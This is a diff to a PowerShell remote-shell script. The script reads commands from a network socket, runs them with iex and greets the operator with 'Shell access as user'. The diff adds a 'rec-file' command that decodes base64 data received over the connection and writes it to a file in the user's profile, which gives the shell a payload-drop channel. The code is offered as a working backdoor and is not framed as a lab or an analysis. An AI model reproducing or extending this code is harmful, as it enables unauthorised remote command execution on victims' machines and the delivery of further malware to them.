@@ -12,13 +12,15 @@ while($true){
 		$buffer = new-object System.Byte[] 1024;
 		$encoding = new-object System.Text.UTF8Encoding;
 		$writer.Write("Shell access as user $env:username.`r`n");
+		cd ~
 		do{
 			$writer.Write("> ");
 			$writer.Flush() ;
 			$read = $null;
 			while($stream.DataAvailable -or ($read = $stream.Read($buffer, 0, 1024)) -eq $null){}
 			$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
-			if(!$out.equals("exit") -and !$out.equals("r") -and !$out.equals("rm-all")){
+			$out_split = $out -split " ";
+			if(!$out.equals("exit") -and !$out.equals("r") -and !$out.equals("rm-all") -and !$out_split[0].equals("rec-file")){
 				try{
 					$res = iex $out -ErrorAction Stop
 				} catch [System.Management.Automation.CommandNotFoundException]{} catch {throw}
@@ -30,6 +32,9 @@ while($true){
 				$writer.close();
 				$socket.close()
 				stop-process -Force -name powershell
+			}elseif($out_split[0].equals("rec-file") -and $out_split.length -eq 2){
+                $bytes = [Convert]::FromBase64String($out_split[1])
+				[IO.File]::WriteAllBytes("$ENV:UserProfile\received.out", $bytes)
 			}
 		} While (!$out.equals("exit"))
 		$writer.close();
